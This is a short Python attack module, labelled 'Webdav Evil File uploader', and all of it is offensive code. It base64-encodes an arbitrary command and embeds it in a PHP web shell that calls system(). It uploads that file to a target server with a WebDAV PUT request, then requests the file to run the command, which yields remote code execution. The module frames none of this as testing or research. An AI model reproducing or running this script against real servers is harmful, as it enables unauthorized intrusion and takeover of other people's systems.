'''
name : Webdav Evil File uploader
description : This mocule uploads evil file on the target server
version : 1.0
author : Ayato
'''

import requests
import base64
import subprocess

php_data = '<?php system(base64_decode("__")); ?>'

def encode(cmd):
    try:
        print(f'[*] Encoding command: {cmd[:50]} ...')
        encoded_bytes = base64.b64encode(cmd.encode('utf-8'))
        res = encoded_bytes.decode('utf-8')
        print(f'[*] Encoded command: {res[:50]} ...')
        return res
    except Exception as e:
        print(f'[-] Encoding Error: {e}')
        return False

def upload_file(url, cmd, user_agent):
    print('[*] Trying upload file via WebDAV')
    headers = {
        'User-Agent': f'{user_agent}'
    }
    try:
        raw = f"'{php_data.replace('__', encode(cmd))}'"
        res = requests.put(
            headers=headers,
            url = url,
            data = raw
        )
        if res.status_code == 201:
            print(f"[+] Upload success on {url}")
            return True
        else:
            print(f"[-] Upload failed with statuscode: {res.status_code}")
            return False
    except Exception as e:
        print(f'[-] Upload Error: {e}')
        return False

def trigger_exploit(url, user_agent):
    print('[*] Trying trigger exploit via php file')
    headers = {
        'User-Agent': f'{user_agent}'
    }
    try:
        response = requests.get(
            url,
            headers=headers
        )
        if response.status_code == 200:
            print(f'[+] Payload triggered')
        else:
            print(f'[-] Failed to trigger php file')
    except Exception as e:
        print(f'[-] Error: {e}')
        return False
    return True

def run(ip, filename, cmd, user_agent):
    print('[*] Running file uploader via WEBDAV...')
    url = f'http://{ip}/{filename}'
    if upload_file(url, cmd, user_agent):
        if trigger_exploit(url, user_agent):
            print('[+] Exploit success')
            return 0
    else:
        return -1
    return -1

